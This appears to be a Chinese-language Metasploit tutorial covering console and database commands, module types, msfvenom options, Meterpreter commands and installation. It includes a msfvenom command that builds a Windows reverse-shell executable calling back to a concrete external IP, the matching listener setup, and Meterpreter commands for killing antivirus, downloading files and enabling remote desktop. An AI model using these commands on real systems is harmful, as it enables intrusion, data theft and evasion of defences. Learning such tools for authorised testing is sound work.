### 一、简介

msf是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode,并持续保持更新。metasploit让复杂的漏洞攻击流程变的非常简单，一个电脑小白经过几个小时的学习，就能对操作系统等主流漏洞发起危害性攻击

<br/>

### 二、基础使用

#### 1、常用命令

- 基础指令
  ```text
  show exploits            #查看所有可用的渗透攻击程序代码
  show auxiliary           #查看所有可用的辅助攻击工具
  show [options/advanced]  #查看改模块可用选项
  show targets             #查看该模块适用的攻击目标类型
  show payloads            #查看该模块适用的所有载荷代码
  search                   #根据关键字所有某模块
  info                     #显示某模块的详细信息
  use                      #使用某渗透攻击模块
  back                     #回退
  set/unset                #设置/禁用模块中的某个参数
  setg/unsetg              #设置/禁用适用于所有模块的全局参数
  ```

<br/>

- 数据库管理命令
  ```text
  msfdb init               #启动并初始化数据库
  msfdb reinit             #删除并重新初始化数据库
  msfdb delete             #删除并停止使用数据库
  msfdb start              #启动数据库
  msfdb stop               #停止数据库
  msfdb status             #检查服务状态
  msfdb run                #启动数据库并运行msfconsole
  ```

<br/>

- 核心命令
  ```text
  ?                        #帮助菜单
  banner                   #显示Metasploit bannel信息
  cd                       #显示当前工作目录
  color                    #切换颜色
  connect                  #与主机通信
  debug                    #显示对调试有用的信息
  exit                     #推出控制台
  features                 #显示可以选择加入的尚未发布的功能列表
  get                      #获取特定变量的值
  getg                     #获取全局变量的值
  grep                     #筛选以一条命令的输出
  help                     #帮助菜单
  history                  #显示命令历史记录
  load                     #加载框架插件
  quit                     #退出控制台
  repeat                   #重复一个命令列表
  route                    #通过一个session会话路由流量
  save                     #保存活动的那个的数据存储
  sessions                 #导出绘画列表并显示会话信息
  set                      #将一个特定环境的变量设置一个值
  setg                     #将一个全局变量设置一个值
  sleep                    #在指定的秒数内不执行任何操作
  spool                    #将控制台输出写入文件以及屏幕
  threads                  #查看和操作后台线程
  tips                     #显示有用的提示清单
  upload                   #卸载框架插件
  unset                    #取消设置的一个或多个变量
  unsetg                   #取消和值一个或多个全局变量
  version                  #显示框架和控制台库版本号
  ```

<br/>

- 模块命令
  ```text
  advanced                 #显示一个或多个模块的高级选项
  back                     #从当前环境返回
  clearm                   #清除模块堆栈
  favorite                 #将模块添加到最喜欢的模块列表中
  info                     #显示一个或多个模块的详细信息
  listm                    #列表中的模块栈
  loadpath                 #从路径中搜索并加载模块
  options                  #显示一个或多个模块全局选项
  popm                     #将最新的模块从堆栈中弹出并使其处于活动状态
  previous                 #将之前加载的模块设置为当前模块
  pushm                    #将活动模块或模块列表推送到模块堆栈
  reload_all               #重新加载所有模块
  search                   #搜索模块名称和描述
  show                     #显示给定类型的模块或所有模块
  use                      #通过名称或搜索词/索引选择使用模块
  ```

<br/>

- 作业命令
  ```text
  handler                  #启动一个payload处理程序作为job
  jobs                     #显示和管理jobs
  kill                     #杀掉一个job
  rename_job               #重命名一个job
  ```

<br/>

- 资源脚本命令
  ```text
  makerc                   #将从开始输入的命令保存到文件中
  resource                 #运行存储在文件中的命令
  ```
- 后端数据库命令
  ```text
  analyze                  #分析关于一个特定地址或地址范围的数据库信息
  db_connect               #连接一个现有的数据服务
  db_disconnect            #与当前的数据服务断开连接
  db_export                #导出一个包含数据库内容的文件
  db_import                #导入扫描结果文件
  db_nmap                  #执行nmap并自动记录输出
  db_rebuild_cache         #重建数据库存储的模块缓存（已废弃）
  db_remove                #删除已保存的数据服务条目
  db_save                  #将当前的数据服务连接保存为默认，以便在启动时重新连接
  db_status                #显示当前的数据服务状态
  hosts                    #列出数据库中的所有主机
  loot                     #列出数据库中的所有战利品
  notes                    #列出数据库中的所有笔记
  services                 #列出数据库中的所有服务
  vulns                    #列出数据库中的所有漏洞
  workspace                #在数据库工作空间之间切换
  ```
- 后端凭证命令
  ```text
  creds                    #列出数据库中的所有凭证
  ```
- 开发者命令
  ```text
  edit                     #用首选编辑器编辑当前模块或文件
  irb                      #在当前环境下打开一个交互式Ruby shell
  log                      #如果可能的话，将framework.log分页显示到最后
  pry                      #在当前模块或框架上加载Ruby库文件
  reload_lib               #从指定路径重新加载Ruby库文件
  time                     #运行一个特定命令所需的时间
  ```
- 攻击载荷命令
  ```text
  check                    #检查一个目标是否易受攻击
  generate                 #生成一个有效载荷
  reload                   #从磁盘重新加载当前的模块
  to_handler               #用制定的有效载荷创建一个处理程序
  ```

<br/>

#### 2、模块介绍

|模块名|模块功能|模块介绍|
|--|--|--|
|auxiliary|辅助模块|辅助渗透（端口扫描、登录密码爆破、漏洞验证等）|
|exploits|漏洞利用模块|包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。|
|payloads|攻击载荷|主要是攻击成功后再目标机器执行的代码，比如反弹shell的代码|
|post|后渗透阶段模块|漏洞利用成功获得meterpreter之后，向目标发送一些功能性指令，如“提权”等。|
|encoders|编码器模块|主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统|
|evasion|躲避模块|用来生成免杀payload|
|nops|空指令模块|空指令就是空操作，提高payload稳定性及维持大小|

模块介绍：`https://www.infosecmatter.com/metasploit-module-library/`

<br/>

##### a、Payload类型介绍

- singles
- stagers
- stages
- Stageless payload & Staged payload

<br/>

#### 3、Payload生成

##### a、msfvenom简介

Msfvenom -- Metasploit 独立有效负载生成器，是用来生成后门软件的，在目标机上执行后门上线。

```sh
Options:
    -l,  --list       <type>            列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, archs, encrypt, formats, all
    -p, --payload     <payload>         指定使用的payload(攻击载荷)。使用自定义的payload，使用`-`或者stdin指定
        --list-options                  列出 payload 的标准, 高级和规避选项

    -f, --format      <format>            指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
    -e, --encoder     <encoder>           指定需要使用的encoder（编码器）
        --sec-name    <value>           生成大型Windows二进制文件时要使用的新节名。默认值:随机4字节alpha字符串
        --smallest                      使用所有可用的编码器生成最小的有效负载
        --encrypt     <value>           适用于shellcode的加密或编码类型(使用 --list encrypt 列出)
        --encrypt-key <value>           用于--encrypt的密钥
        --encrypt-iv  <value>           --encrypt的初始化向量
    -a, --arch        <architecture>     用于--payload和--encoders的体系结构(使用 --list archs 列出)
        --platform    <platform>         指定payload使用的平台（使用--list platform列出）
    -o, --out         <path>            保存payload
    -b, --bad-chars   <list>              设定规避字符集，比如: '\x00\xff'
    -n, --nopsled     <length>            为payload预先指定一个NOP滑动长度
        --pad-nops                      将由-n指定的nopsled大小用作总有效负载大小，自动添加nopsled数量(nops减去payload长度)
    -s, --space       <length>            设定有效攻击荷载的最大长度
        --encoder-space <length>        编码的有效负载的最大大小（默认为-s value）
    -i, --iterations  <count>             指定payload的编码次数
    -c, --add-code    <path>              指定一个附加的win32 shellcode文件
    -x, --template    <path>              指定一个自定义的可执行文件作为模板
    -k, --keep                          保护模板程序的动作，注入的payload作为一个新的进程运行
    -v, --var-name    <name>            指定一个自定义的变量，以确定输出格式
    -t, --timeout     <second>          从STDIN读取有效负载时要等待的秒数（默认为30，0 为禁用）
    -h, --help                           查看帮助选项
        --help-formats                   查看msf支持的输出格式列表
```

<br/>

##### b、msfvenom生成Payload

生成payload有两个必须的选项：-p  -f ，使用-p来指定要使用的payload，使用-f来指定payload的输出格式。

注意生成payload操作使用的是msfvenom独立命令，实在linux的cli中独立操作，并非msf控制台中。

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=107.182.190.222 LPORT=9809 -f exe > cale.exe 
```

监听

```sh
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 107.182.190.222
set LPORT 9809
run
```

<br/>

#### 4、监听模块

<br/>

##### a、meterpreter简介

Meterpreter是MSF中的一个杀手锏，通常作为漏洞溢出后的攻击载荷所使用，攻击载荷在触发漏洞后能够返回给我们一个控制通道。

Meterpreter是MSF的一个扩展模块，可以调用MSF的一些功能，对目标系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等等。

<br/>

##### b、常用操作命令

将当前session挂起：`background`

列出当前所有session：`sessions -l`

进入某个session：`sessions -i id`

关闭会话：`exit`

帮助信息：`help`

系统平台信息：`sysinfo`

屏幕截取：`screenshot`

命令行shell：`shell`

查看本地目录：`getlwd`

切换本地目录：`lcd`

查看目录：`getwd`

查看文件目录列表：`ls`

切换目录：`cd`

删除文件：`rm`

下载文件：`download c:\\1.txt 1.txt`

上传文件：`upload /var/www/wce.exe wce.exe`

搜索文件：`search -d c: -f *.doc` 

执行程序：`execute -f cmd.exe -i`

查看进程：`ps`

查看当前用户权限：`getuid`

关闭杀毒软件：`run killav`

启用远程桌面：`run getgui-e`

<br/>

#### 5、meterpreter常用shell

- reverse_tcp
  ```sh
  # 基于TCP的反弹shell
  linux/meterpreter/reverse_tcp
  windows/meterpreter/reverse_tcp
  ```
- bind_tcp
  ```sh
  # 基于TCP的正向连接shell，因为在内网跨网段时无法连接到攻击者的机器，所以在内网中经常会使用，不需要设置LHOST
  linux/meterpreter/bind_tcp
  ```
- reverse_http
  ```sh
  # 基于http方式的反向连接，在网速慢的情况下不稳定
  windows/meterpreter/reverse_http
  ```
- reverse_https
  ```sh
  # 基于https方式的反向连接，在网速慢的情况下不稳定
  windows/meterpreter/reverse_https
  ```

<br/>

<br/>

### 三、安装程序

#### 1.使用官方命令安装

```sh
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

#### 2.初始化

```sh
# 开启数据库
➜  ~ service postgresql start
# 初始化
➜  ~ msfdb init
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

#### 3.启动

```sh
# 静默启动
➜  ~ msfconsole -q
# 查看数据库连接状态
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

# 也可以连接其他数据库并重新初始化
msf6 > db_connect 用户名:口令@服务器地址:端口/数据库名称
```
